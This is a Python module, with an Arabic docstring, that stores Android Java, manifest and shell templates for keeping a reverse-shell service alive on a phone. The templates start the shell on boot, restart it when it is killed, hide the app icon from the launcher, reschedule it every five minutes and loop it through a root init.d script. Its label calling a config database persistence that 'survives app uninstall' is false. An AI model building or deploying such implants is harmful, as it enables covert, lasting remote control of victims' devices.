#!/usr/bin/env python3
"""
أكواد الاستمرارية (Persistence) للتطبيقات
"""

# Android Boot Receiver
ANDROID_BOOT_RECEIVER = """
package com.example.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Start our service on boot
            Intent serviceIntent = new Intent(context, ShellService.class);
            context.startService(serviceIntent);
        }
    }
}
"""

# Android Service with Auto-restart
ANDROID_PERSISTENT_SERVICE = """
package com.example.app;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class PersistentService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        // Start shell in background thread
        new Thread(new Runnable() {
            public void run() {
                ReverseShell.start();
            }
        }).start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Restart if killed
        return START_STICKY;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Restart when app is removed from recent tasks
        Intent restartService = new Intent(getApplicationContext(), this.getClass());
        restartService.setPackage(getPackageName());
        startService(restartService);
        super.onTaskRemoved(rootIntent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        // Auto-restart
        Intent restartService = new Intent(getApplicationContext(), this.getClass());
        startService(restartService);
    }
}
"""

# Android Activity Hiding
ANDROID_HIDE_ICON = """
<!-- In AndroidManifest.xml -->
<activity android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <!-- Remove this to hide from launcher -->
        <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
    </intent-filter>
</activity>

<!-- Add this to start from other apps -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="http" />
    <data android:scheme="https" />
    <data android:host="*" />
</intent-filter>
"""

# Scheduled Tasks (Alarm Manager)
ANDROID_SCHEDULED_TASKS = """
package com.example.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

public class Scheduler {
    public static void scheduleRestart(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, ShellService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT
        );
        
        // Schedule every 5 minutes
        long interval = 5 * 60 * 1000; // 5 minutes in milliseconds
        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + interval,
            interval,
            pendingIntent
        );
    }
}
"""

# Root Persistence (if device is rooted)
ROOT_PERSISTENCE = """
#!/system/bin/sh
# Root persistence script
# Copy to /system/etc/init.d/ or /system/bin/

while true; do
    # Check if our app is running
    if ! ps | grep -q "com.example.app"; then
        # Start the app
        am start -n com.example.app/.MainActivity
    fi
    
    # Check connection
    if ! netstat -an | grep -q "{PORT}"; then
        # Restart shell
        am startservice -n com.example.app/.ShellService
    fi
    
    sleep 30
done
"""

# Startup Script for /etc/init.d
INITD_SCRIPT = """#!/system/bin/sh
# /etc/init.d/99uams

case "$1" in
    start)
        echo "Starting UAMS Service..."
        am startservice -n com.example.app/.ShellService
        ;;
    stop)
        echo "Stopping UAMS Service..."
        am stopservice com.example.app/.ShellService
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}"
        exit 1
        ;;
esac

exit 0
"""

# Database-based Persistence (Survives app uninstall)
DATABASE_PERSISTENCE = """
package com.example.app;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class PersistenceDB extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "system_config.db";
    private static final int DATABASE_VERSION = 1;
    
    private static final String TABLE_CONFIG = "config";
    private static final String COLUMN_KEY = "key";
    private static final String COLUMN_VALUE = "value";
    
    public PersistenceDB(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }
    
    @Override
    public void onCreate(SQLiteDatabase db) {
        String createTable = "CREATE TABLE " + TABLE_CONFIG + " (" +
                            COLUMN_KEY + " TEXT PRIMARY KEY, " +
                            COLUMN_VALUE + " TEXT)";
        db.execSQL(createTable);
        
        // Insert persistence config
        ContentValues values = new ContentValues();
        values.put(COLUMN_KEY, "auto_start");
        values.put(COLUMN_VALUE, "true");
        db.insert(TABLE_CONFIG, null, values);
        
        values.put(COLUMN_KEY, "check_interval");
        values.put(COLUMN_VALUE, "300000"); // 5 minutes
        db.insert(TABLE_CONFIG, null, values);
    }
    
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_CONFIG);
        onCreate(db);
    }
    
    public String getConfig(String key) {
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.query(TABLE_CONFIG, 
                                new String[]{COLUMN_VALUE},
                                COLUMN_KEY + "=?",
                                new String[]{key},
                                null, null, null);
        
        if (cursor != null && cursor.moveToFirst()) {
            String value = cursor.getString(0);
            cursor.close();
            return value;
        }
        return null;
    }
}
"""

def get_persistence_code(persistence_type="service"):
    """
    Get persistence code by type
    """
    persistence_type = persistence_type.lower()
    
    persistence_codes = {
        "boot_receiver": ANDROID_BOOT_RECEIVER,
        "persistent_service": ANDROID_PERSISTENT_SERVICE,
        "hide_icon": ANDROID_HIDE_ICON,
        "scheduled_tasks": ANDROID_SCHEDULED_TASKS,
        "root_persistence": ROOT_PERSISTENCE,
        "initd_script": INITD_SCRIPT,
        "database": DATABASE_PERSISTENCE
    }
    
    return persistence_codes.get(persistence_type, ANDROID_PERSISTENT_SERVICE)

def get_all_persistence_methods():
    """
    Return all available persistence methods
    """
    return {
        "boot_receiver": "Start on boot (Broadcast Receiver)",
        "persistent_service": "Sticky Service with auto-restart",
        "hide_icon": "Hide app icon from launcher",
        "scheduled_tasks": "Scheduled tasks with AlarmManager",
        "root_persistence": "Root persistence script",
        "initd_script": "Init.d script (requires root)",
        "database": "Database-based persistence"
    }

if __name__ == "__main__":
    print("Available Persistence Methods:")
    for name, desc in get_all_persistence_methods().items():
        print(f"  {name}: {desc}")
    
    print("\nSample Persistent Service:")
    print(get_persistence_code("persistent_service")[:300] + "...")